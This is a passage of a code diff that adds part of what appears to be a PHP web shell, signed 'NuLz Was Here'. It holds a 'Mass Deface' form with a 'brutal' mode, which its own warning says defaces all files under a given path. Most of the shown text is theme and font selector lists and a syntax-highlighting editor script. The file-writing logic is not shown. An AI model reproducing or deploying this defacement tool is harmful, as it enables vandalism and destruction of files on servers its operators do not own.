+                <option>panda-syntax-dark.min.css</option>
+                <option>panda-syntax-light.min.css</option>
+                <option>paraiso-dark.min.css</option>
+                <option>paraiso-light.min.css</option>
+                <option>pojoaque.min.css</option>
+                <option>purebasic.min.css</option>
+                <option>qtcreator-dark.min.css</option>
+                <option>qtcreator-light.min.css</option>
+                <option>rainbow.min.css</option>
+                <option>routeros.min.css</option>
+                <option>school-book.min.css</option>
+                <option>shades-of-purple.min.css</option>
+                <option>srcery.min.css</option>
+                <option>stackoverflow-dark.min.css</option>
+                <option>stackoverflow-light.min.css</option>
+                <option>sunburst.min.css</option>
+                <option>tokyo-night-dark.min.css</option>
+                <option>tokyo-night-light.min.css</option>
+                <option>tomorrow-night-blue.min.css</option>
+                <option>tomorrow-night-bright.min.css</option>
+                <option>vs.min.css</option>
+                <option selected>vs2015.min.css</option>
+                <option>xcode.min.css</option>
+                <option>xt256.min.css</option>
+                <option>base16/3024.min.css</option>
+                <option>base16/apathy.min.css</option>
+                <option>base16/apprentice.min.css</option>
+                <option>base16/ashes.min.css</option>
+                <option>base16/atelier-cave-light.min.css</option>
+                <option>base16/atelier-cave.min.css</option>
+                <option>base16/atelier-dune-light.min.css</option>
+                <option>base16/atelier-dune.min.css</option>
+                <option>base16/atelier-estuary-light.min.css</option>
+                <option>base16/atelier-estuary.min.css</option>
+                <option>base16/atelier-forest-light.min.css</option>
+                <option>base16/atelier-forest.min.css</option>
+                <option>base16/atelier-heath-light.min.css</option>
+                <option>base16/atelier-heath.min.css</option>
+                <option>base16/atelier-lakeside-light.min.css</option>
+                <option>base16/atelier-lakeside.min.css</option>
+                <option>base16/atelier-plateau-light.min.css</option>
+                <option>base16/atelier-plateau.min.css</option>
+                <option>base16/atelier-savanna-light.min.css</option>
+                <option>base16/atelier-savanna.min.css</option>
+                <option>base16/atelier-seaside-light.min.css</option>
+                <option>base16/atelier-seaside.min.css</option>
+                <option>base16/atelier-sulphurpool-light.min.css</option>
+                <option>base16/atelier-sulphurpool.min.css</option>
+                <option>base16/atlas.min.css</option>
+                <option>base16/bespin.min.css</option>
+                <option>base16/black-metal-bathory.min.css</option>
+                <option>base16/black-metal-burzum.min.css</option>
+                <option>base16/black-metal-dark-funeral.min.css</option>
+                <option>base16/black-metal-gorgoroth.min.css</option>
+                <option>base16/black-metal-immortal.min.css</option>
+                <option>base16/black-metal-khold.min.css</option>
+                <option>base16/black-metal-marduk.min.css</option>
+                <option>base16/black-metal-mayhem.min.css</option>
+                <option>base16/black-metal-nile.min.css</option>
+                <option>base16/black-metal-venom.min.css</option>
+                <option>base16/black-metal.min.css</option>
+                <option>base16/brewer.min.css</option>
+                <option>base16/bright.min.css</option>
+                <option>base16/brogrammer.min.css</option>
+                <option>base16/brush-trees-dark.min.css</option>
+                <option>base16/brush-trees.min.css</option>
+                <option>base16/chalk.min.css</option>
+                <option>base16/circus.min.css</option>
+                <option>base16/classic-dark.min.css</option>
+                <option>base16/classic-light.min.css</option>
+                <option>base16/codeschool.min.css</option>
+                <option>base16/colors.min.css</option>
+                <option>base16/cupcake.min.css</option>
+                <option>base16/cupertino.min.css</option>
+                <option>base16/danqing.min.css</option>
+                <option>base16/darcula.min.css</option>
+                <option>base16/dark-violet.min.css</option>
+                <option>base16/darkmoss.min.css</option>
+                <option>base16/darktooth.min.css</option>
+                <option>base16/decaf.min.css</option>
+                <option>base16/default-dark.min.css</option>
+                <option>base16/default-light.min.css</option>
+                <option>base16/dirtysea.min.css</option>
+                <option>base16/dracula.min.css</option>
+                <option>base16/edge-dark.min.css</option>
+                <option>base16/edge-light.min.css</option>
+                <option>base16/eighties.min.css</option>
+                <option>base16/embers.min.css</option>
+                <option>base16/equilibrium-dark.min.css</option>
+                <option>base16/equilibrium-gray-dark.min.css</option>
+                <option>base16/equilibrium-gray-light.min.css</option>
+                <option>base16/equilibrium-light.min.css</option>
+                <option>base16/espresso.min.css</option>
+                <option>base16/eva-dim.min.css</option>
+                <option>base16/eva.min.css</option>
+                <option>base16/flat.min.css</option>
+                <option>base16/framer.min.css</option>
+                <option>base16/fruit-soda.min.css</option>
+                <option>base16/gigavolt.min.css</option>
+                <option>base16/github.min.css</option>
+                <option>base16/google-dark.min.css</option>
+                <option>base16/google-light.min.css</option>
+                <option>base16/grayscale-dark.min.css</option>
+                <option>base16/grayscale-light.min.css</option>
+                <option>base16/green-screen.min.css</option>
+                <option>base16/gruvbox-dark-hard.min.css</option>
+                <option>base16/gruvbox-dark-medium.min.css</option>
+                <option>base16/gruvbox-dark-pale.min.css</option>
+                <option>base16/gruvbox-dark-soft.min.css</option>
+                <option>base16/gruvbox-light-hard.min.css</option>
+                <option>base16/gruvbox-light-medium.min.css</option>
+                <option>base16/gruvbox-light-soft.min.css</option>
+                <option>base16/hardcore.min.css</option>
+                <option>base16/harmonic16-dark.min.css</option>
+                <option>base16/harmonic16-light.min.css</option>
+                <option>base16/heetch-dark.min.css</option>
+                <option>base16/heetch-light.min.css</option>
+                <option>base16/helios.min.css</option>
+                <option>base16/hopscotch.min.css</option>
+                <option>base16/horizon-dark.min.css</option>
+                <option>base16/horizon-light.min.css</option>
+                <option>base16/humanoid-dark.min.css</option>
+                <option>base16/humanoid-light.min.css</option>
+                <option>base16/ia-dark.min.css</option>
+                <option>base16/ia-light.min.css</option>
+                <option>base16/icy-dark.min.css</option>
+                <option>base16/ir-black.min.css</option>
+                <option>base16/isotope.min.css</option>
+                <option>base16/kimber.min.css</option>
+                <option>base16/london-tube.min.css</option>
+                <option>base16/macintosh.min.css</option>
+                <option>base16/marrakesh.min.css</option>
+                <option>base16/materia.min.css</option>
+                <option>base16/material-darker.min.css</option>
+                <option>base16/material-lighter.min.css</option>
+                <option>base16/material-palenight.min.css</option>
+                <option>base16/material-vivid.min.css</option>
+                <option>base16/material.min.css</option>
+                <option>base16/mellow-purple.min.css</option>
+                <option>base16/mexico-light.min.css</option>
+                <option>base16/mocha.min.css</option>
+                <option>base16/monokai.min.css</option>
+                <option>base16/nebula.min.css</option>
+                <option>base16/nord.min.css</option>
+                <option>base16/nova.min.css</option>
+                <option>base16/ocean.min.css</option>
+                <option>base16/oceanicnext.min.css</option>
+                <option>base16/one-light.min.css</option>
+                <option>base16/onedark.min.css</option>
+                <option>base16/outrun-dark.min.css</option>
+                <option>base16/papercolor-dark.min.css</option>
+                <option>base16/papercolor-light.min.css</option>
+                <option>base16/paraiso.min.css</option>
+                <option>base16/pasque.min.css</option>
+                <option>base16/phd.min.css</option>
+                <option>base16/pico.min.css</option>
+                <option>base16/pop.min.css</option>
+                <option>base16/porple.min.css</option>
+                <option>base16/qualia.min.css</option>
+                <option>base16/railscasts.min.css</option>
+                <option>base16/rebecca.min.css</option>
+                <option>base16/ros-pine-dawn.min.css</option>
+                <option>base16/ros-pine-moon.min.css</option>
+                <option>base16/ros-pine.min.css</option>
+                <option>base16/sagelight.min.css</option>
+                <option>base16/sandcastle.min.css</option>
+                <option>base16/seti-ui.min.css</option>
+                <option>base16/shapeshifter.min.css</option>
+                <option>base16/silk-dark.min.css</option>
+                <option>base16/silk-light.min.css</option>
+                <option>base16/snazzy.min.css</option>
+                <option>base16/solar-flare-light.min.css</option>
+                <option>base16/solar-flare.min.css</option>
+                <option>base16/solarized-dark.min.css</option>
+                <option>base16/solarized-light.min.css</option>
+                <option>base16/spacemacs.min.css</option>
+                <option>base16/summercamp.min.css</option>
+                <option>base16/summerfruit-dark.min.css</option>
+                <option>base16/summerfruit-light.min.css</option>
+                <option>base16/synth-midnight-terminal-dark.min.css</option>
+                <option>base16/synth-midnight-terminal-light.min.css</option>
+                <option>base16/tango.min.css</option>
+                <option>base16/tender.min.css</option>
+                <option>base16/tomorrow-night.min.css</option>
+                <option>base16/tomorrow.min.css</option>
+                <option>base16/twilight.min.css</option>
+                <option>base16/unikitty-dark.min.css</option>
+                <option>base16/unikitty-light.min.css</option>
+                <option>base16/vulcan.min.css</option>
+                <option>base16/windows-10-light.min.css</option>
+                <option>base16/windows-10.min.css</option>
+                <option>base16/windows-95-light.min.css</option>
+                <option>base16/windows-95.min.css</option>
+                <option>base16/windows-high-contrast-light.min.css</option>
+                <option>base16/windows-high-contrast.min.css</option>
+                <option>base16/windows-nt-light.min.css</option>
+                <option>base16/windows-nt.min.css</option>
+                <option>base16/woodland.min.css</option>
+                <option>base16/xcode-dusk.min.css</option>
+                <option>base16/zenburn.min.css</option>
+            </select><br><br>
+            <span>Font:</span>
+            <select id="selectFont" class="bg-black">
+                <option>Roboto Mono</option>
+                <option>Consolas</option>
+                <option>Cascadia Mono</option>
+                <option>Inconsolata</option>
+                <option>Source Code Pro</option>
+                <option>IBM Plex Mono</option>
+                <option>Space Mono</option>
+                <option>PT Mono</option>
+                <option>Ubuntu Mono</option>
+                <option>Nanum Gothic Coding</option>
+                <option>Cousine</option>
+                <option>Fira Mono</option>
+                <option>Share Tech Mono</option>
+                <option>Courier Prime</option>
+                <option>Anonymous Pro</option>
+                <option>Cutive Mono</option>
+                <option>VT323</option>
+                <option>JetBrains Mono</option>
+                <option>Noto Sans Mono</option>
+                <option>Red Hat Mono</option>
+                <option>Martian Mono</option>
+                <option>Major Mono Display</option>
+                <option>Nova Mono</option>
+                <option>Syne Mono</option>
+                <option>Xanh Mono</option>
+                <option>Monofett</option>
+            </select><br><br>
+            <span>Font Size (pt):</span>
+            <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
+            <span>Language:</span>
+            <select id="selectLanguage" class="bg-black">
+                <option value="language-html">HTML</option>
+                <option value="language-javascript">JavaScript</option>
+                <option value="language-python">Python</option>
+                <option value="language-java">Java</option>
+                <option value="language-csharp">C#</option>
+                <option value="language-php">PHP</option>
+                <option value="language-cpp">C++</option>
+                <option value="language-typescript">TypeScript</option>
+                <option value="language-ruby">Ruby</option>
+            </select><br><br>
+            <div id="divCodeWrapper">
+                <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
+                <textarea name="massdefacefilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+            </div>
+            <script type="text/javascript">
+            const textarea1 = document.getElementById("textarea1");
+            const codeBlock = document.getElementById("codeBlock");
+            let content = textarea1.value;
+            content = content.replace(/&/g, "&amp;");
+            content = content.replace(/</g, "&lt;");
+            content = content.replace(/>/g, "&gt;");
+            codeBlock.innerHTML = content;
+            highlightJS();
+    
+            function updateCode() {
+                let content = textarea1.value;
+                content = content.replace(/&/g, "&amp;");
+                content = content.replace(/</g, "&lt;");
+                content = content.replace(/>/g, "&gt;");
+                codeBlock.innerHTML = content;
+                highlightJS();
+            }
+    
+            function highlightJS() {
+                document.querySelectorAll("pre code").forEach((el) => {
+                    hljs.highlightElement(el);
+                });
+            }
+    
+            textarea1.addEventListener("input", () => {
+                updateCode();
+            });
+    
+            textarea1.addEventListener("scroll", () => {
+                codeBlock.scrollTop = textarea1.scrollTop;
+                codeBlock.scrollLeft = textarea1.scrollLeft;
+            });
+    
+            textarea1.addEventListener("keydown", function (e) {
+                if (e.key === "Enter") {
+                    e.preventDefault();
+                    var cursorPos = textarea1.selectionStart;
+                    var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
+                    var indent = prevLine.match(/^\s*/)[0];
+                    textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
+                    textarea1.blur();
+                    textarea1.focus();
+                    updateCode();
+                    return;
+                }
+                if (e.key === "Tab" && !e.shiftKey &&
+                    textarea1.selectionStart == textarea1.selectionEnd) {
+                    e.preventDefault();
+                    let cursorPosition = textarea1.selectionStart;
+                    let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
+                        textarea1.value.substring(cursorPosition);
+                    textarea1.value = newValue;
+                    textarea1.selectionStart = cursorPosition + 4;
+                    textarea1.selectionEnd = cursorPosition + 4;    
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key === "Tab" && e.shiftKey &&
+    
+                    textarea1.selectionStart == textarea1.selectionEnd) {
+    
+                    e.preventDefault();
+    
+                    let cursorPosition = textarea1.selectionStart;
+                    let leadingSpaces = 0;
+                    for (let i = 0; i < 4; i++) {
+                        if (textarea1.value[cursorPosition - i - 1] === " ") {
+                            leadingSpaces++;
+                        } else {
+                            break;
+                        }
+                    }
+    
+                    if (leadingSpaces > 0) {
+                        let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
+                            textarea1.value.substring(cursorPosition);
+                        textarea1.value = newValue;
+                        textarea1.selectionStart = cursorPosition - leadingSpaces;
+                        textarea1.selectionEnd = cursorPosition - leadingSpaces;
+                    }
+    
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
+                    e.preventDefault();
+                    let lines = this.value.split("\n");
+    
+                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+    
+                    let spacesRemovedFirstLine = 0;
+                    let spacesRemoved = 0;
+    
+                    if (e.shiftKey) {
+                        for (let i = startPos; i <= endPos; i++) {
+                            lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
+                                if (i == startPos)
+                                    spacesRemovedFirstLine = match.length;
+                                spacesRemoved += match.length;
+    
+                                return "";
+                            });
+                        }
+                    } else {
+                        for (let i = startPos; i <= endPos; i++) {
+                            lines[i] = "    " + lines[i];
+                        }
+                    }
+                    let start = this.selectionStart;
+                    let end = this.selectionEnd;
+                    this.value = lines.join("\n");
+                    this.selectionStart = e.shiftKey ?
+                        start - spacesRemovedFirstLine : start + 4;
+                    this.selectionEnd = e.shiftKey ?
+                        end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
+                    updateCode();
+                    return;
+                }
+                if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
+    
+                    e.preventDefault();
+                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
+                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
+                    let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
+                    let cursorPosInLine = cursorLine.length;
+                    let totalLinesRemove = endPos - startPos + 1;
+                    let lines = this.value.split("\n");
+                    let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
+                    lines.splice(startPos, totalLinesRemove);
+                    let newLine = lines[startPos] || "";
+                    if (newLine.length < cursorPosInLine) {
+                        cursorPosInLine = newLine.length;
+                    }
+                    newStart += cursorPosInLine;
+    
+                    this.value = lines.join("\n");
+                    this.selectionStart = this.selectionEnd = newStart; 
+                    updateCode();
+                    return;
+                }
+    
+                if (e.key === "Home") {
+                    let line = this.value.substring(0, this.selectionStart).split("\n").pop();
+                    let cursorPosInLine = line.length;
+                    let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
+                    let firstNonWhitespacePos = line.search(/\S/);
+                    if (firstNonWhitespacePos >= cursorPosInLine) {
+                        return true;
+                    }
+                    else if (firstNonWhitespacePos === -1) {
+                        return true;
+                    }
+                    e.preventDefault();
+                    this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
+                    return;
+                }
+            });
+    
+            document.getElementById("selectStyle").addEventListener("change", (e) => {
+                document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
+            });
+    
+            function updateFont() {
+                let selectFont = document.getElementById("selectFont");
+                let fontName = selectFont.options[selectFont.selectedIndex].text;
+                let fontNameUrl = fontName.replace(" ", "+");
+                let inputFontSize = document.getElementById("inputFontSize");
+                document.getElementById("style2").textContent = `
+                @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
+                pre, code, textarea {
+                    font-family: "${fontName}", monospace !important;
+                    font-size: ${inputFontSize.value}pt !important;
+                }`;
+            }
+    
+            document.getElementById("selectLanguage").addEventListener("change", function () {
+                document.getElementById("codeBlock").className = this.value;
+                highlightJS();
+            });
+    
+            document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });
+
+            document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
+            </script>
+            ';
+        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
+        echo '<button type="submit" name="btn-normal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Deface</button>';
+        echo '</form>';
+            } elseif ($mode === $brutal) {
+                echo '<form class="ml-4 my-2" action="" method="POST">';
+                echo '<span class="block '.$txtRed.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
+                echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdefacepath">
+                    </label>';
+                        echo '<label class="block">
+                    <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                    <span class="block '.$txtRed.'">(<font class="'.$txtYellow.' font-bold">WARNING</font>) This Brutal Mode Deface All Files! <font class="'.$txtYellow.' font-bold">DANGEROUS!</font></span>
+                    </label>';
+                    echo '
+                    <style type="text/css">
+                    @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
+
+                    #divCodeWrapper {
+                        height: 80vh;
+                        width: 100%;
+                        overflow: hidden;
+                        border: 1px solid #a5a5a5;
+                        position: relative;
+                    }
+
+                    #preCode {
+                        height: 100%;
+                        width: 100%;
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        overflow: hidden;
+                        padding: 0;
+                        margin: 0;
+                        background: #1b1b1b;
+                    }
+
+                        #preCode code {
+                            padding: 15px;
+                            height: calc(100% - 30px);
+                            width: calc(100% - 30px);
+                            font-family: "Roboto Mono", monospace;
+                            font-weight: 400;
+                            font-size: 12pt;
+                            line-height: 150%;
+                            overflow-y: scroll;
+                            overflow-x: auto;
+                        }
+
+                    textarea {
+                        font-family: "Roboto Mono", monospace;
+                        font-weight: 400;
+                        font-size: 12pt;
+                        line-height: 150%;
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        height: calc(100% - 30px);
+                        width: calc(100% - 30px);
+                        padding: 15px;
+                        z-index: 2;
+                        overflow-x: auto;
+                        overflow-y: scroll;
+                        white-space: nowrap;
+                        background-color: rgba(0,0,0,0);
+                        color: rgba(0,0,0,0);
+                        caret-color: white;
+                    }
+                </style>
+                <span class="block '.$txtBlue.' font-medium">Filecontent <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
+                <span>Theme:</span>
+                    <select id="selectStyle" class="bg-black">
+                        <option>a11y-dark.min.css</option>
+                        <option>a11y-light.min.css</option>
+                        <option>agate.min.css</option>
+                        <option>an-old-hope.min.css</option>
+                        <option>androidstudio.min.css</option>
+                        <option>arduino-light.min.css</option>
+                        <option>arta.min.css</option>
+                        <option>ascetic.min.css</option>
+                        <option>atom-one-dark-reasonable.min.css</option>
+                        <option>atom-one-dark.min.css</option>
+                        <option>atom-one-light.min.css</option>
+                        <option>brown-paper.min.css</option>
+                        <option>codepen-embed.min.css</option>
+                        <option>color-brewer.min.css</option>
+                        <option>dark.min.css</option>
+                        <option>default.min.css</option>
+                        <option>devibeans.min.css</option>
+                        <option>docco.min.css</option>
+                        <option>far.min.css</option>
+                        <option>felipec.min.css</option>
+                        <option>foundation.min.css</option>
+                        <option>github-dark-dimmed.min.css</option>
+                        <option>github-dark.min.css</option>
+                        <option>github.min.css</option>
+                        <option>gml.min.css</option>
+                        <option>googlecode.min.css</option>
+                        <option>gradient-dark.min.css</option>
+                        <option>gradient-light.min.css</option>
+                        <option>grayscale.min.css</option>
+                        <option>hybrid.min.css</option>
+                        <option>idea.min.css</option>
+                        <option>intellij-light.min.css</option>
+                        <option>ir-black.min.css</option>
+                        <option>isbl-editor-dark.min.css</option>
+                        <option>isbl-editor-light.min.css</option>
+                        <option>kimbie-dark.min.css</option>
+                        <option>kimbie-light.min.css</option>
+                        <option>lightfair.min.css</option>
+                        <option>lioshi.min.css</option>
+                        <option>magula.min.css</option>
+                        <option>mono-blue.min.css</option>
+                        <option>monokai-sublime.min.css</option>
+                        <option>monokai.min.css</option>
+                        <option>night-owl.min.css</option>
+                        <option>nnfx-dark.min.css</option>
+                        <option>nnfx-light.min.css</option>
+                        <option>nord.min.css</option>
+                        <option>obsidian.min.css</option>
+                        <option>panda-syntax-dark.min.css</option>
+                        <option>panda-syntax-light.min.css</option>
+                        <option>paraiso-dark.min.css</option>
+                        <option>paraiso-light.min.css</option>
+                        <option>pojoaque.min.css</option>
+                        <option>purebasic.min.css</option>
+                        <option>qtcreator-dark.min.css</option>
+                        <option>qtcreator-light.min.css</option>
+                        <option>rainbow.min.css</option>
+                        <option>routeros.min.css</option>
+                        <option>school-book.min.css</option>
+                        <option>shades-of-purple.min.css</option>
+                        <option>srcery.min.css</option>
+                        <option>stackoverflow-dark.min.css</option>
+                        <option>stackoverflow-light.min.css</option>
+                        <option>sunburst.min.css</option>
+                        <option>tokyo-night-dark.min.css</option>
+                        <option>tokyo-night-light.min.css</option>
+                        <option>tomorrow-night-blue.min.css</option>
+                        <option>tomorrow-night-bright.min.css</option>
+                        <option>vs.min.css</option>
+                        <option selected>vs2015.min.css</option>
+                        <option>xcode.min.css</option>
+                        <option>xt256.min.css</option>
+                        <option>base16/3024.min.css</option>
+                        <option>base16/apathy.min.css</option>
+                        <option>base16/apprentice.min.css</option>
+                        <option>base16/ashes.min.css</option>
+                        <option>base16/atelier-cave-light.min.css</option>
+                        <option>base16/atelier-cave.min.css</option>
+                        <option>base16/atelier-dune-light.min.css</option>
+                        <option>base16/atelier-dune.min.css</option>
+                        <option>base16/atelier-estuary-light.min.css</option>
+                        <option>base16/atelier-estuary.min.css</option>
+                        <option>base16/atelier-forest-light.min.css</option>
+                        <option>base16/atelier-forest.min.css</option>
+                        <option>base16/atelier-heath-light.min.css</option>
+                        <option>base16/atelier-heath.min.css</option>
+                        <option>base16/atelier-lakeside-light.min.css</option>
+                        <option>base16/atelier-lakeside.min.css</option>
+                        <option>base16/atelier-plateau-light.min.css</option>
+                        <option>base16/atelier-plateau.min.css</option>
+                        <option>base16/atelier-savanna-light.min.css</option>
+                        <option>base16/atelier-savanna.min.css</option>
+                        <option>base16/atelier-seaside-light.min.css</option>
+                        <option>base16/atelier-seaside.min.css</option>
+                        <option>base16/atelier-sulphurpool-light.min.css</option>
+                        <option>base16/atelier-sulphurpool.min.css</option>
+                        <option>base16/atlas.min.css</option>
+                        <option>base16/bespin.min.css</option>
+                        <option>base16/black-metal-bathory.min.css</option>
+                        <option>base16/black-metal-burzum.min.css</option>
+                        <option>base16/black-metal-dark-funeral.min.css</option>
+                        <option>base16/black-metal-gorgoroth.min.css</option>
+                        <option>base16/black-metal-immortal.min.css</option>
+                        <option>base16/black-metal-khold.min.css</option>
+                        <option>base16/black-metal-marduk.min.css</option>
+                        <option>base16/black-metal-mayhem.min.css</option>
+                        <option>base16/black-metal-nile.min.css</option>
+                        <option>base16/black-metal-venom.min.css</option>
+                        <option>base16/black-metal.min.css</option>
+                        <option>base16/brewer.min.css</option>
+                        <option>base16/bright.min.css</option>
+                        <option>base16/brogrammer.min.css</option>
+                        <option>base16/brush-trees-dark.min.css</option>
+                        <option>base16/brush-trees.min.css</option>
+                        <option>base16/chalk.min.css</option>
+                        <option>base16/circus.min.css</option>
+                        <option>base16/classic-dark.min.css</option>
+                        <option>base16/classic-light.min.css</option>
+                        <option>base16/codeschool.min.css</option>
+                        <option>base16/colors.min.css</option>
+                        <option>base16/cupcake.min.css</option>
+                        <option>base16/cupertino.min.css</option>
+                        <option>base16/danqing.min.css</option>
+                        <option>base16/darcula.min.css</option>
+                        <option>base16/dark-violet.min.css</option>
+                        <option>base16/darkmoss.min.css</option>
+                        <option>base16/darktooth.min.css</option>
+                        <option>base16/decaf.min.css</option>
+                        <option>base16/default-dark.min.css</option>
+                        <option>base16/default-light.min.css</option>
+                        <option>base16/dirtysea.min.css</option>
+                        <option>base16/dracula.min.css</option>
+                        <option>base16/edge-dark.min.css</option>
+                        <option>base16/edge-light.min.css</option>
+                        <option>base16/eighties.min.css</option>
+                        <option>base16/embers.min.css</option>
+                        <option>base16/equilibrium-dark.min.css</option>
+                        <option>base16/equilibrium-gray-dark.min.css</option>
+                        <option>base16/equilibrium-gray-light.min.css</option>
+                        <option>base16/equilibrium-light.min.css</option>
+                        <option>base16/espresso.min.css</option>
+                        <option>base16/eva-dim.min.css</option>
+                        <option>base16/eva.min.css</option>
+                        <option>base16/flat.min.css</option>
+                        <option>base16/framer.min.css</option>
+                        <option>base16/fruit-soda.min.css</option>
+                        <option>base16/gigavolt.min.css</option>
+                        <option>base16/github.min.css</option>
+                        <option>base16/google-dark.min.css</option>
+                        <option>base16/google-light.min.css</option>
+                        <option>base16/grayscale-dark.min.css</option>
+                        <option>base16/grayscale-light.min.css</option>
+                        <option>base16/green-screen.min.css</option>
+                        <option>base16/gruvbox-dark-hard.min.css</option>
+                        <option>base16/gruvbox-dark-medium.min.css</option>
+                        <option>base16/gruvbox-dark-pale.min.css</option>
+                        <option>base16/gruvbox-dark-soft.min.css</option>
+                        <option>base16/gruvbox-light-hard.min.css</option>
+                        <option>base16/gruvbox-light-medium.min.css</option>
+                        <option>base16/gruvbox-light-soft.min.css</option>
+                        <option>base16/hardcore.min.css</option>
+                        <option>base16/harmonic16-dark.min.css</option>
+                        <option>base16/harmonic16-light.min.css</option>
+                        <option>base16/heetch-dark.min.css</option>
+                        <option>base16/heetch-light.min.css</option>
+                        <option>base16/helios.min.css</option>
+                        <option>base16/hopscotch.min.css</option>
+                        <option>base16/horizon-dark.min.css</option>
+                        <option>base16/horizon-light.min.css</option>
+                        <option>base16/humanoid-dark.min.css</option>
+                        <option>base16/humanoid-light.min.css</option>
+                        <option>base16/ia-dark.min.css</option>
+                        <option>base16/ia-light.min.css</option>
+                        <option>base16/icy-dark.min.css</option>
+                        <option>base16/ir-black.min.css</option>
+                        <option>base16/isotope.min.css</option>
+                        <option>base16/kimber.min.css</option>
+                        <option>base16/london-tube.min.css</option>
+                        <option>base16/macintosh.min.css</option>
+                        <option>base16/marrakesh.min.css</option>
+                        <option>base16/materia.min.css</option>
+                        <option>base16/material-darker.min.css</option>
+                        <option>base16/material-lighter.min.css</option>
+                        <option>base16/material-palenight.min.css</option>
+                        <option>base16/material-vivid.min.css</option>
+                        <option>base16/material.min.css</option>
+                        <option>base16/mellow-purple.min.css</option>
+                        <option>base16/mexico-light.min.css</option>
+                        <option>base16/mocha.min.css</option>
+                        <option>base16/monokai.min.css</option>
+                        <option>base16/nebula.min.css</option>
+                        <option>base16/nord.min.css</option>
+                        <option>base16/nova.min.css</option>
+                        <option>base16/ocean.min.css</option>
+                        <option>base16/oceanicnext.min.css</option>
+                        <option>base16/one-light.min.css</option>
+                        <option>base16/onedark.min.css</option>
+                        <option>base16/outrun-dark.min.css</option>
+                        <option>base16/papercolor-dark.min.css</option>
+                        <option>base16/papercolor-light.min.css</option>
+                        <option>base16/paraiso.min.css</option>
+                        <option>base16/pasque.min.css</option>
+                        <option>base16/phd.min.css</option>
+                        <option>base16/pico.min.css</option>
+                        <option>base16/pop.min.css</option>
+                        <option>base16/porple.min.css</option>
+                        <option>base16/qualia.min.css</option>
+                        <option>base16/railscasts.min.css</option>
+                        <option>base16/rebecca.min.css</option>
+                        <option>base16/ros-pine-dawn.min.css</option>
+                        <option>base16/ros-pine-moon.min.css</option>
+                        <option>base16/ros-pine.min.css</option>
+                        <option>base16/sagelight.min.css</option>
+                        <option>base16/sandcastle.min.css</option>
+                        <option>base16/seti-ui.min.css</option>
+                        <option>base16/shapeshifter.min.css</option>
+                        <option>base16/silk-dark.min.css</option>
+                        <option>base16/silk-light.min.css</option>
+                        <option>base16/snazzy.min.css</option>
+                        <option>base16/solar-flare-light.min.css</option>
+                        <option>base16/solar-flare.min.css</option>
+                        <option>base16/solarized-dark.min.css</option>
+                        <option>base16/solarized-light.min.css</option>
+                        <option>base16/spacemacs.min.css</option>
+                        <option>base16/summercamp.min.css</option>
+                        <option>base16/summerfruit-dark.min.css</option>
+                        <option>base16/summerfruit-light.min.css</option>
+                        <option>base16/synth-midnight-terminal-dark.min.css</option>
+                        <option>base16/synth-midnight-terminal-light.min.css</option>
+                        <option>base16/tango.min.css</option>
+                        <option>base16/tender.min.css</option>
+                        <option>base16/tomorrow-night.min.css</option>
+                        <option>base16/tomorrow.min.css</option>
+                        <option>base16/twilight.min.css</option>
+                        <option>base16/unikitty-dark.min.css</option>
+                        <option>base16/unikitty-light.min.css</option>
+                        <option>base16/vulcan.min.css</option>
+                        <option>base16/windows-10-light.min.css</option>
+                        <option>base16/windows-10.min.css</option>
+                        <option>base16/windows-95-light.min.css</option>
+                        <option>base16/windows-95.min.css</option>
+                        <option>base16/windows-high-contrast-light.min.css</option>
+                        <option>base16/windows-high-contrast.min.css</option>
+                        <option>base16/windows-nt-light.min.css</option>
+                        <option>base16/windows-nt.min.css</option>
+                        <option>base16/woodland.min.css</option>
+                        <option>base16/xcode-dusk.min.css</option>
+                        <option>base16/zenburn.min.css</option>
+                    </select><br><br>
+                    <span>Font:</span>
